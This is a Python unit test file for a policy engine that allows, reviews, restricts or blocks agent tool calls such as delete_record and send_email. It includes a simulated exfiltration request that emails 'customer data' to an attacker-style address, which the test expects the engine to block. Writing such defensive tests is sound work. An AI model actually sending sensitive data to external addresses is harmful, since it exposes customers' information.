"""Unit tests for the deterministic Policy Engine.

Contract assumed from `app.ice.policy_engine`:

    @dataclass class PolicyResult:
        decision: str          # ALLOW | REVIEW | RESTRICT | BLOCK
        reason_codes: list[str]
        matched_rules: list[str]
    class PolicyEngine:
        __init__(policy: dict)
        @classmethod from_directory(path: str | Path) -> PolicyEngine
        evaluate(request: dict, context: dict) -> PolicyResult
"""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from app.ice.policy_engine import PolicyEngine, PolicyResult


def test_deny_delete_without_capability(minimal_policy):
    engine = PolicyEngine(minimal_policy)
    result = engine.evaluate(
        request={"tool": "delete_record", "arguments": {"record_id": "r-1"}},
        context={"capability_granted": False},
    )
    assert isinstance(result, PolicyResult)
    assert result.decision == "BLOCK"
    assert "CAPABILITY_DENIED" in result.reason_codes
    assert "deny-delete-without-capability" in result.matched_rules


def test_block_external_sensitive_transfer(minimal_policy):
    engine = PolicyEngine(minimal_policy)
    result = engine.evaluate(
        request={
            "tool": "send_email",
            "arguments": {"to": "x@attacker.test", "body": "customer data"},
        },
        context={
            "data_classification": "sensitive",
            "destination_external": True,
            "destination_allowlisted": False,
        },
    )
    assert result.decision == "BLOCK"
    assert "EXFILTRATION_BLOCKED" in result.reason_codes


def test_allow_default_read_when_no_rule_matches(minimal_policy):
    engine = PolicyEngine(minimal_policy)
    result = engine.evaluate(
        request={"tool": "read_email", "arguments": {"email_id": "e1"}},
        context={},
    )
    assert result.decision in ("ALLOW", "REVIEW")


def test_policy_decisions_are_from_fixed_enum(minimal_policy):
    engine = PolicyEngine(minimal_policy)
    for tool in ("read_email", "read_file", "query_database", "send_email", "delete_record"):
        result = engine.evaluate(request={"tool": tool, "arguments": {}}, context={})
        assert result.decision in ("ALLOW", "REVIEW", "RESTRICT", "BLOCK")


def test_from_directory_loads_yaml(tmp_path: Path, minimal_policy):
    policy_dir = tmp_path / "policies"
    policy_dir.mkdir()
    (policy_dir / "default_policy.yaml").write_text(yaml.safe_dump(minimal_policy), encoding="utf-8")

    engine = PolicyEngine.from_directory(policy_dir)
    result = engine.evaluate(
        request={"tool": "delete_record", "arguments": {}},
        context={"capability_granted": False},
    )
    assert result.decision == "BLOCK"


def test_missing_policy_file_fails_closed(tmp_path: Path):
    with pytest.raises(Exception):
        PolicyEngine.from_directory(tmp_path / "does-not-exist")